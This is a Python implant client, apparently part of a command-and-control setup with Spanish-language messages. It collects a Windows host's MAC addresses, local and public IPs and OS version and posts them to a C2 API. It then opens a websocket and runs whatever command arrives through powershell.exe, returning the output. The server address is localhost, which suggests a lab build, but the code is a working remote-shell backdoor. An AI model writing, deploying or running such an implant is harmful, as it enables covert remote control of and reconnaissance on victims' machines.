import asyncio
from websockets import connect
from websockets.exceptions import ConnectionClosedError
import json
import subprocess
import signal
import sys
import requests

GROUP="grupo1"

def def_handler(sig, frame):
    
    print("\n\n[!] Saliendo..\n")	
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def cmo(cmd):
    result=subprocess.run(f"powershell.exe -c {cmd}", capture_output=True, text=True)
    return result.stdout, result.stderr


def get_macs():
    macs_output, err = cmo("Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress")
    maclist=[]
    if macs_output:
        for num in macs_output.splitlines():
            maclist.append(num.replace("\n","").replace("\r",""))
        return maclist
    else:
        return ['undefined']

def get_local_ips():
    ips_output, err = cmo("Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress")
    iplist=[]
    if ips_output:
        for ip in ips_output.splitlines():
            iplist.append(ip.replace("\n","").replace("\r",""))
        return iplist
    else:
        return ['undefined']

def get_public_ip():
    ip_output, err = cmo('Invoke-RestMethod -Uri "https://api.ipify.org"')
    iplist=[]
    if ip_output:
        return ip_output
    else:
        return "undefined"

def get_operating_system():
    sysop, err = cmo('(Get-CimInstance Win32_OperatingSystem).Caption')
    if sysop:
        return sysop
    else:
        return "undefined"



def register():
    maclist = get_macs()
    local_ip = get_local_ips()
    public_ip = get_public_ip().replace("\n","").replace("\r","")
    operating_system = get_operating_system().replace("\n","").replace("\r","")

    model={
        'impl_mac': maclist,
        'group': GROUP,
        'public_ip': public_ip,
        'local_ip': local_ip,
        'operating_system': operating_system
    }

    response = requests.post("http://localhost:4000/api/impl/new/1", json=model)
    print(response.status_code)
    print(response.text)

async def recibe():

    register()

    try:

        uri = "ws://localhost:4000/api/rcv?id=2"
        async with connect(uri) as ws:

            try:
                while True:
                    cmd = await ws.recv()
                    if cmd and cmd != "undefined":
                        try:

                            data = json.loads(cmd.replace("'", '"'))
                            out, err = cmo(data["cmd"])

                            print(f" {data["cmd"]}")
                            if out:
                                print(f"> {out}")
                                await ws.send(out)
                            else:
                                print(f"> {err}")
                                await ws.send(err)
                        
                        except json.JSONDecodeError as e:
                            print(f"JSON inválido: {e}")
                        except Exception as e:
                            print(f"Error procesando el comando: {e}")

            except ConnectionClosedError as e:
                print(f"[!] Conexión cerrada: {e}. Reintentando en 5 segundos...")
                await asyncio.sleep(5)
            except Exception as e:
                print(f"[!] Error inesperado: {e}. Reintentando en 5 segundos...")
                await asyncio.sleep(5)


    except Exception as e:
        print(f": {e}")

asyncio.run( recibe() )